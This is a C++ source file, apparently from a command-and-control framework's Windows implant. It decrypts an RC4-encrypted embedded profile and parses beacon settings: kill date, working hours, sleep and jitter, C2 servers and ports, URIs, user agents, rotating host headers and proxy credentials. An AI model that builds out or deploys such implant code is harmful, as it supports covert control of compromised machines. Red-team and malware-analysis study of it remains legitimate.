// 文件作用：Windows agent 配置解析实现：从内嵌 profile 里解出 sleep、listener、URI、代理等运行参数。
#include "AgentConfig.h"
#include "Packer.h"
#include "Crypt.h"
#include "utils.h"
#include "config.h"

// AgentConfig::operator new 使用本项目的内存分配函数创建配置对象。
void* AgentConfig::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

// AgentConfig::operator delete 释放配置对象占用的本地内存。
void AgentConfig::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(AgentConfig));
}

// AgentConfig 构造函数读取内嵌 profile，解密后解析 sleep、listener、URI、Header、代理等配置。
AgentConfig::AgentConfig()
{
	ULONG length        = 0;
	ULONG size          = getProfileSize();
	CHAR* profileBytes  = (CHAR*) MemAllocLocal(size);
	memcpy(profileBytes, getProfile(), size);

	Packer* packer = new Packer((BYTE*)profileBytes, size);
	ULONG profileSize = packer->Unpack32();

	this->encrypt_key = (PBYTE) MemAllocLocal(16);
	memcpy(this->encrypt_key, packer->data() + 4 + profileSize, 16);

	DecryptRC4(packer->data() + 4, profileSize, this->encrypt_key, 16);

	this->agent_type   = packer->Unpack32();
	this->kill_date    = packer->Unpack32();
	this->working_time = packer->Unpack32();
	this->sleep_delay  = packer->Unpack32();
	this->jitter_delay = packer->Unpack32();
	this->listener_type = packer->Unpack32();

	this->profile.use_ssl       = packer->Unpack8();
	this->profile.servers_count = packer->Unpack32();
	this->profile.servers       = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID));
	this->profile.ports         = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD));
	for (int i = 0; i < this->profile.servers_count; i++) {
		this->profile.servers[i] = packer->UnpackBytesCopy(&length);
		this->profile.ports[i]   = (WORD) packer->Unpack32();
	}
	this->profile.http_method = packer->UnpackBytesCopy(&length);
	this->profile.uri_count   = packer->Unpack32();
	this->profile.uris        = (BYTE**) MemAllocLocal(this->profile.uri_count * sizeof(LPVOID));
	for (ULONG i = 0; i < this->profile.uri_count; i++) {
		this->profile.uris[i] = packer->UnpackBytesCopy(&length);
	}
	this->profile.parameter   = packer->UnpackBytesCopy(&length);
	this->profile.ua_count    = packer->Unpack32();
	this->profile.user_agents = (BYTE**) MemAllocLocal(this->profile.ua_count * sizeof(LPVOID));
	for (ULONG i = 0; i < this->profile.ua_count; i++) {
		this->profile.user_agents[i] = packer->UnpackBytesCopy(&length);
	}
	this->profile.http_headers = packer->UnpackBytesCopy(&length);
	this->profile.ans_pre_size = packer->Unpack32();
	this->profile.ans_size     = packer->Unpack32() + this->profile.ans_pre_size;
	this->profile.hh_count     = packer->Unpack32();
	this->profile.host_headers = (BYTE**) MemAllocLocal(this->profile.hh_count * sizeof(LPVOID));
	for (ULONG i = 0; i < this->profile.hh_count; i++) {
		this->profile.host_headers[i] = packer->UnpackBytesCopy(&length);
	}
	this->profile.rotation_mode  = (BYTE) packer->Unpack32();
	this->profile.proxy_type     = (BYTE) packer->Unpack32();
	this->profile.proxy_host     = packer->UnpackBytesCopy(&length);
	this->profile.proxy_port     = (WORD) packer->Unpack32();
	this->profile.proxy_username = packer->UnpackBytesCopy(&length);
	this->profile.proxy_password = packer->UnpackBytesCopy(&length);
	this->download_chunk_size    = 0x19000;

	delete packer;
	MemFreeLocal((LPVOID*)&profileBytes, size);
}
